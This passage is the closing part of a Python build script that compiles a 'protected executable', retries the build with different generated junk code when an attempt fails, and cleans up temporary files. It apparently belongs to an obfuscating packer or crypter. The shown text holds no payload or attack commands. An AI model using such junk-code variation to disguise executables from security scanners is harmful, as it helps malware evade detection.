                print_info(f"Build attempt successful in {build_duration:.2f} seconds.")

            except Exception as e:
                retries += 1
                build_duration = time.time() - build_start_time
                print_error(f"Build attempt {retries}/{max_retries+1} failed after {build_duration:.2f} seconds.")
                if retries <= max_retries:
                    print_warning(f"Retrying with different junk code...")
                    # Clean up potentially problematic generated files for this attempt
                    for f_key in ["cpp", "obj", "rc_header", "rc_script", "res"]:
                        f_path = tmp_files.get(f_key)
                        if f_path and os.path.exists(f_path):
                            try: os.remove(f_path)
                            except OSError: pass
                    # Brief pause before retry
                    time.sleep(0.5)
                else:
                    print_error(f"All {max_retries + 1} build attempts failed. Last error details should be above.")
                    args.keep_temp = True # Force keep temp on final failure
                    sys.exit(1) # Exit after final retry failure

        # Should only reach here if success is True
        if not success:
            print_error(f"Internal error: Loop completed without success flag set after {retries} retries.")
            args.keep_temp = True
            sys.exit(1)

        # --- Final Success ---
        end_time = time.time()
        print_success("=" * 50)
        print_success(f"Protected executable created successfully!")
        print_success(f"Output: {output_exe_abs}")
        print_success(f"Total time: {end_time - start_time:.2f} seconds")
        print_success("=" * 50)

    except SystemExit as e:
        # Don't print generic error if sys.exit was called intentionally
        if e.code != 0:
            print_warning("Operation aborted.")
    except KeyboardInterrupt:
        stop_spinner()
        print_warning("\nOperation interrupted by user.")
        args.keep_temp = True # Keep files if interrupted
        sys.exit(1)
    except Exception as e:
        stop_spinner()
        print_error(f"An unexpected critical error occurred: {type(e).__name__}: {e}")
        import traceback
        print(traceback.format_exc()) # Print full traceback for unexpected errors
        args.keep_temp = True # Keep files on unexpected error
        sys.exit(1)
    finally:
        # --- Cleanup ---
        stop_spinner() # Ensure spinner is stopped
        if not args.keep_temp and temp_dir and os.path.isdir(temp_dir):
            print_info("Cleaning up temporary files...")
            import shutil
            try:
                shutil.rmtree(temp_dir)
                print_info(f"Removed temporary directory: {temp_dir}")
            except OSError as e:
                print_warning(f"Failed to completely remove temp directory {temp_dir}: {e}")
        elif args.keep_temp and temp_dir:
            print_info(f"Temporary files kept in: {temp_dir}")
        elif not temp_dir:
            print_info("No temporary directory was created.")


if __name__ == "__main__":
    main()